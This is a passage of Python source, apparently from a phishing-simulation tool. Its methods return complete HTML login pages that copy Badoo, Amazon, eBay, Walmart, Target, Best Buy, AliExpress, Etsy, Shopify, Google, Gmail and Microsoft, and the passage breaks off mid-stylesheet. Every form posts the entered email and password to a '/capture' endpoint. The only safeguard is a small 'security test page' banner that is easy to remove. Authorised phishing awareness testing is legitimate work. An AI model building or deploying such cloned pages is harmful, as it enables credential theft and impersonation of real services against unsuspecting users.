        .links a { color: #ff6b6b; text-decoration: none; font-size: 14px; }
        .divider { text-align: center; margin: 20px 0; color: #666; font-size: 14px; position: relative; }
        .divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 30%; height: 1px; background: #ddd; }
        .divider::before { left: 0; }
        .divider::after { right: 0; }
        .social-buttons { display: flex; gap: 10px; margin: 20px 0; }
        .social-btn { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 30px; background: #fff; cursor: pointer; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #4ecdc4; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 30px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Badoo</h1><p>Meet new people</p></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up</a></div>
            </form>
            <div class="divider">or connect with</div>
            <div class="social-buttons"><button class="social-btn">Facebook</button><button class="social-btn">Google</button><button class="social-btn">Apple</button></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== E-COMMERCE TEMPLATES ====================
    
    def _get_amazon_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Amazon Ember', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 350px; width: 100%; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo svg { width: 120px; height: 40px; }
        .login-box { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,0.5); }
        button { width: 100%; padding: 8px; background: linear-gradient(to bottom,#f7dfa5,#f0c14b); border: 1px solid #a88734; border-radius: 3px; font-size: 13px; cursor: pointer; }
        button:hover { background: linear-gradient(to bottom,#f5d78c,#eeb933); }
        .help { margin: 20px 0; }
        .help a { color: #0066c0; text-decoration: none; font-size: 13px; }
        .divider { border-top: 1px solid #e7e7e7; margin: 20px 0; text-align: center; position: relative; }
        .divider span { background: #fff; padding: 0 8px; color: #767676; font-size: 12px; position: relative; top: -10px; }
        .new-account { text-align: center; }
        .new-account button { background: linear-gradient(to bottom,#f7f8fa,#e7e9ec); border: 1px solid #adb1b8; color: #111; }
        .warning { margin-top: 20px; padding: 10px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 120 40"><text x="20" y="25" fill="#000" font-size="24" font-weight="bold">amazon</text></svg></div>
        <div class="login-box">
            <h1>Sign-In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Email or mobile phone number</label><input type="text" name="email" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" required></div>
                <button type="submit">Continue</button>
                <div class="help"><a href="#">Forgot Password?</a><br><a href="#">Other issues with Sign-In</a></div>
            </form>
        </div>
        <div class="divider"><span>New to Amazon?</span></div>
        <div class="new-account"><button onclick="window.location.href='#'">Create your Amazon account</button></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_ebay_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>eBay Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 40px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 30px; color: #333; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        .stay-signed { display: flex; align-items: center; margin-bottom: 20px; }
        .stay-signed input { margin-right: 10px; }
        button { width: 100%; padding: 12px; background: #0654ba; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background: #054297; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0654ba; text-decoration: none; font-size: 14px; }
        .divider { border-bottom: 1px solid #ddd; margin: 20px 0; }
        .signup { text-align: center; }
        .signup a { color: #0654ba; text-decoration: none; font-weight: 500; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 150 40"><rect width="150" height="40" fill="#e43137"/><text x="20" y="25" fill="white" font-size="20" font-weight="bold">eBay</text></svg></div>
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="stay-signed"><input type="checkbox" id="stay"><label for="stay">Stay signed in</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="divider"></div>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_walmart_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Walmart - Account Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Bogle', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; margin-bottom: 10px; color: #041e42; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; font-weight: 500; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0071ce; }
        .options { display: flex; justify-content: space-between; align-items: center; margin: 15px 0; }
        .remember { display: flex; align-items: center; }
        .remember input { margin-right: 5px; }
        .forgot a { color: #0071ce; text-decoration: none; }
        button { width: 100%; padding: 14px; background: #0071ce; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #004c99; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0071ce; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="#0071ce" font-size="32" font-weight="bold">Walmart</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <div class="subtitle">to access your account</div>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Email address</label><input type="text" name="email" placeholder="you@example.com" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
                <div class="options"><div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div><div class="forgot"><a href="#">Forgot password?</a></div></div>
                <button type="submit">Sign In</button>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_target_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Target : Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 100px; height: 100px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #333; text-align: center; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #cc0000; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #cc0000; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #a30000; }
        .forgot { text-align: center; margin: 15px 0; }
        .forgot a { color: #cc0000; text-decoration: none; }
        .signup { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
        .signup a { color: #cc0000; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#cc0000"/><text x="30" y="65" fill="white" font-size="40" font-weight="bold">T</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign in</button>
                <div class="forgot"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_bestbuy_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Best Buy - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Human BBY', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0046be; font-size: 36px; font-weight: 700; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h2 { font-size: 24px; margin-bottom: 20px; color: #1e252b; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #c5cbd5; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0046be; }
        button { width: 100%; padding: 14px; background: #0046be; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #00359b; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .links { text-align: center; margin: 15px 0; }
        .links a { color: #0046be; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0046be; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h1>Best Buy</h1></div>
        <div class="login-box">
            <h2>Sign In</h2>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Keep me signed in</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_aliexpress_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>AliExpress - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #e62e04; font-size: 32px; font-weight: 700; }
        .tabs { display: flex; margin-bottom: 30px; border-bottom: 2px solid #f0f0f0; }
        .tab { flex: 1; text-align: center; padding: 10px; color: #666; cursor: pointer; }
        .tab.active { color: #e62e04; border-bottom: 2px solid #e62e04; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #e62e04; }
        button { width: 100%; padding: 12px; background: #e62e04; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background: #c62802; }
        .links { display: flex; justify-content: space-between; margin: 20px 0; }
        .links a { color: #e62e04; text-decoration: none; font-size: 13px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #e62e04; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>AliExpress</h1></div>
            <div class="tabs"><div class="tab active">Sign In</div><div class="tab">Register</div></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or Phone Number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_etsy_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Etsy - Sign in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Graphik', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #f56400; font-size: 32px; font-style: italic; font-weight: 700; }
        h2 { font-size: 24px; margin-bottom: 20px; color: #222; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #f56400; }
        button { width: 100%; padding: 12px; background: #222; color: #fff; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #000; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .links { text-align: center; margin: 15px 0; }
        .links a { color: #f56400; text-decoration: none; font-size: 14px; }
        .divider { text-align: center; margin: 20px 0; color: #666; font-size: 14px; position: relative; }
        .divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #ddd; }
        .divider::before { left: 0; }
        .divider::after { right: 0; }
        .signup { text-align: center; }
        .signup a { color: #f56400; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 6px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Etsy</h1></div>
            <h2>Sign in</h2>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="divider">or</div>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_shopify_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Shopify - Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #f8f8f8 0%, #e8e8e8 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 450px; width: 100%; }
        .logo { text-align: center; margin-bottom: 40px; }
        .logo svg { width: 120px; height: 40px; }
        .login-box { background: #fff; border-radius: 12px; padding: 48px 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; margin-bottom: 10px; color: #212b36; }
        .subtitle { color: #637381; margin-bottom: 30px; font-size: 16px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #212b36; font-weight: 500; font-size: 14px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #c4cdd5; border-radius: 6px; font-size: 16px; outline: none; transition: all 0.2s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #5c6ac4; box-shadow: 0 0 0 3px rgba(92,106,196,0.1); }
        .password-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .forgot-link { color: #5c6ac4; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #5c6ac4; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #4959bd; }
        .signup { text-align: center; margin-top: 30px; padding-top: 30px; border-top: 1px solid #dfe3e8; }
        .signup p { color: #637381; font-size: 14px; }
        .signup a { color: #5c6ac4; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 6px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 120 40"><path d="M20 10L10 30L30 30L20 10Z" fill="#95bf47"/><path d="M40 10L30 30L50 30L40 10Z" fill="#5c6ac4"/><text x="60" y="25" fill="#212b36" font-size="18" font-weight="bold">Shopify</text></svg></div>
        <div class="login-box">
            <h1>Log in</h1>
            <div class="subtitle">to continue to Shopify</div>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Email</label><input type="text" name="email" placeholder="shop@example.com" required></div>
                <div class="form-group"><div class="password-header"><label>Password</label><a href="#" class="forgot-link">Forgot?</a></div><input type="password" name="password" placeholder="••••••••" required></div>
                <button type="submit">Log in</button>
            </form>
            <div class="signup"><p>Don't have a Shopify store? <a href="#">Create your store</a></p></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== CLOUD & PRODUCTIVITY TEMPLATES ====================
    
    def _get_google_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Google Sign-In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f0f4f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 450px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 75px; height: 24px; }
        .login-box { background: #fff; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
        .subtitle { color: #202124; font-size: 16px; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1a73e8; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .forgot-email { margin: 10px 0 20px; }
        .forgot-email a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .guest { margin: 30px 0 20px; }
        .guest a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .create-account { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .next-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 9px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-btn:hover { background: #1b66c9; }
        .footer { margin-top: 40px; text-align: center; color: #5f6368; font-size: 12px; }
        .footer a { color: #5f6368; text-decoration: none; margin: 0 8px; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 75 24"><path fill="#4285F4" d="M45.09 7.98l-2.14 1.58c-.44-.67-1.12-1.08-2.08-1.08-1.44 0-2.46 1.11-2.46 2.64 0 1.53 1.02 2.64 2.46 2.64.96 0 1.64-.41 2.08-1.08l2.14 1.58c-.94 1.28-2.4 1.96-4.22 1.96-2.98 0-5.15-2.1-5.15-5.1 0-3 2.17-5.1 5.15-5.1 1.82 0 3.28.68 4.22 1.96z"/><path fill="#EA4335" d="M61 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#FBBC05" d="M24 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#4285F4" d="M42.02 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#34A853" d="M52.1 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <div class="subtitle">to continue to Google</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="forgot-email"><a href="#">Forgot email?</a></div>
                <div class="guest"><a href="#">Use a private browsing window to sign in. Learn more about using Guest mode.</a></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="actions"><a href="#" class="create-account">Create account</a><button type="submit" class="next-btn">Next</button></div>
            </form>
            <div class="footer"><select><option>English (United States)</option></select><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f0f4f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 450px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 75px; height: 24px; }
        .logo h1 { color: #1a73e8; font-size: 24px; margin: 10px 0 0; }
        .login-box { background: #fff; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
        .subtitle { color: #202124; font-size: 16px; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1a73e8; }
        .create-account { text-align: left; margin: 20px 0; }
        .create-account a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .next-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 9px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 75 24"><path fill="#4285F4" d="M45.09 7.98l-2.14 1.58c-.44-.67-1.12-1.08-2.08-1.08-1.44 0-2.46 1.11-2.46 2.64 0 1.53 1.02 2.64 2.46 2.64.96 0 1.64-.41 2.08-1.08l2.14 1.58c-.94 1.28-2.4 1.96-4.22 1.96-2.98 0-5.15-2.1-5.15-5.1 0-3 2.17-5.1 5.15-5.1 1.82 0 3.28.68 4.22 1.96z"/><path fill="#EA4335" d="M61 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#FBBC05" d="M24 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#4285F4" d="M42.02 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/><path fill="#34A853" d="M52.1 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/></svg><h1>Gmail</h1></div>
        <div class="login-box">
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="create-account"><a href="#">Create account</a></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="actions"><a href="#" class="forgot">Forgot password?</a><button type="submit" class="next-btn">Next</button></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_microsoft_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Microsoft account | Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 440px; width: 100%; }
        .login-box { background: #fff; border-radius: 2px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 16px; }
        .logo svg { width: 108px; height: 23px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1e1e1e; }
        .subtitle { color: #1e1e1e; font-size: 15px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 6px 10px; border: 1px solid #666; border-radius: 2px; font-size: 15px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0067b8; }
        .no-account { margin: 16px 0; }
        .no-account a { color: #0067b8; text-decoration: none; font-size: 13px; }
        .signin-options { margin: 16px 0; }
        .signin-options a { color: #0067b8; text-decoration: none; font-size: 13px; }
        .actions { display: flex; justify-content: flex-end; margin-top: 24px; }
        .next-btn { background: #0067b8; color: #fff; border: none; padding: 10px 30px; font-size: 15px; cursor: pointer; }
        .next-btn:hover { background: #0058a5; }
        .footer { margin-top: 20px; text-align: center; color: #5e5e5e; font-size: 11px; }
        .footer a { color: #5e5e5e; text-decoration: none; margin: 0 5px; }
